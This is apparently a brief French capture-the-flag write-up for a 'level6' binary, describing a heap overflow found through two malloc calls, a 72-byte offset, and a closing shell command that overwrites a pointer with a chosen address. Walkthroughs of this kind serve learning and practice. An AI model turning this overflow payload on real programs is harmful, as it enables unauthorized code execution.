Quand on disassamble le level6 on voit que y'a 2 malloc donc potentiel overflow

ltrace ./level6 test

y'a 2 malloc 1 de 64 et un de 4

avec comme adresse 0x0804a008 (64) vs 0x0804a050 (4)

si on fait 0x0804a050 - 0x0804a008 = 0x48 = 72 en decimal

grace au buffer overflow generator : https://wiremask.eu/tools/buffer-overflow-pattern-generator/

en essayant on voit que ca segfault a 72 donc ca veut dire qu'il a une difference de 72 va donc faire comme les autres flag

sauf qu'on rajoute le python en argument de l'executable car sinon il segfault sans argument

./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')